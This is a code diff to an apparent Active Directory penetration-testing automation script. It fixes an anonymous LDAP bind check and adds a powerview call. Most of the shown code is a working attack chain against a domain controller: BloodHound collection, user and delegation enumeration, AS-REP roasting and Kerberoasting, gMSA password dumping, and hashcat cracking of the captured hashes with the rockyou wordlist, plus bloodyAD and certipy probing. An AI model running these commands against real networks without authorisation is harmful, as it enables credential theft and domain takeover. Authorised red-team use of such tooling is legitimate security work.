@@ -1,4 +1,4 @@
-from impacket.ldap import ldap
+from impacket.ldap.ldap import LDAPConnection, Scope
 from libtmux.pane import PaneDirection
 from time import sleep
 
@@ -114,12 +114,13 @@ def ldap_tasks(context):
     if context.creds_exist():
         user, passwd = context.get_initial_cred()
         run_task(context, f"rusthound -d {context.domain} -u {user}@{context.domain} -p '{passwd}' -f {context.hostname}.{context.domain} -n {context.ip} -z -o rusthound; nxc ldap {context.ip} -u {user} -p '{passwd}' --users --find-delegation --trusted-for-delegation --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; nxc ldap {context.ip} -u {user} -p '{passwd}' --gmsa; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
-        run_task(context, f"bloodyAD --host {context.ip} -u {user} -p '{passwd}' get writable; certipy find -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout")
+        run_task(context, f"bloodyAD --host {context.ip} -u {user} -p '{passwd}' get writable; certipy find -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout; powerview {context.domain}/{user}:{passwd}@{context.ip}")
     else:
-        # Check anonymous bind
-        conn = ldap.LDAPConnection(f"ldap://{context.domain}", f"{context.ip}")
         try:
-            conn.login("","")
+            # Check anonymous bind
+            conn = LDAPConnection(f"ldap://{context.domain}", f"{context.ip}")
+            conn.login()
+            conn.search('', scope=Scope('baseObject'), attributes=['defaultNamingContext'])
             write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
             target = context.get_target()
             run_task(context, f"nxc ldap {target} -u '' -p '' --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
